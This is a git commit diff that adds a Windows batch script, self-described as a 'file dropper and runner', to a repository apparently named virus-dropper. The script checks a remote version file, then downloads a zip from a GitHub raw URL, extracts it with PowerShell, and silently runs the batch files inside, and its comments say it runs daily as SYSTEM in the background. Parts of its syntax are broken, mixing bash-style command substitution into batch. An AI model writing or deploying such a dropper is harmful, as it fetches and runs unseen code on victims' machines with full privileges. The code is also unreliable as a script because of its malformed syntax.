ef09251fc3cbbb24f67ea71d06be8c5b4d6cb8d9
YumYummity <103061664+YumYummity@users.noreply.github.com>
2022-04-27 22:09:56 -0400

    Update Update.bat

--- Update.bat
+++ Update.bat
@@ -1,1 +1,14 @@
-::update code here
+@echo off
+::file dropper and runner
+::this file is run daily as ADMINISTRATOR with highets elevation, under the name of SYSTEM, in BACKGROUND
+FOR /F "tokens=* delims=" %%x in (version.txt) DO set /a version = %%x
+output=$(curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Version.txt")
+If %output%>%version%
+  start /min AV.bat
+  curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Updates.zip" --output "Updates.zip"
+  powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('%~dp0'); $zip = $shell.NameSpace('%~dp0\Updates.zip'); $target.CopyHere($zip.Items(), 16); }"
+  del /f /q Updates.zip
+  start /min %~dp0\updates\Updater.bat
+  del version.txt
+  echo %version% > version.txt
+exit
